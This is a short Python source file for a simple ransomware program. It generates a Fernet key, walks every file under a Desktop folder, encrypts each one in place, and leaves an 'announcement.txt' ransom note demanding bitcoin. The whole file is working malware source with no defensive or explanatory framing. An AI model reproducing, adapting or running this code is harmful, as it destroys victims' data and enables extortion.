import os
from cryptography.fernet import Fernet 


# Add Files we go to encrypt in list
files_to_encrypt = []
# Add symtric key file in list 
key_file = []
              
# symtric key generation               
key=Fernet.generate_key()
# Add key to the file 
with open('keyfile','wb') as keyf :
     keyf.write(key)
     

# home dirctory for system 
home = os.path.expanduser('~/Desktop/ran')
# bring all files in system or home dirctory 
for root,dirs,files in os.walk(home):
    for filex in files :
      if filex == "keyfile" :
        key_file.append(root+'/'+filex)
      if filex == "encryption_file.py" or filex=="keyfile" or filex=="decryption_file.py" or filex=="announcement.txt":
          continue 
      files_to_encrypt.append(root+'/'+filex)
      
          
print(files_to_encrypt)
print(key_file)




for FILE in files_to_encrypt :
   with open(FILE,'rb') as f :
       content = f.read()
   con_encrypt=Fernet(key).encrypt(content)
    
   with open(FILE,'wb') as ff :
       ff.write(con_encrypt)
string = """
Announcement your file has been encrpted 
Send back to me bitcoin to decrypt the files
:)
"""       
with open('announcement.txt','w') as A :
      A.write(string)       
           
    


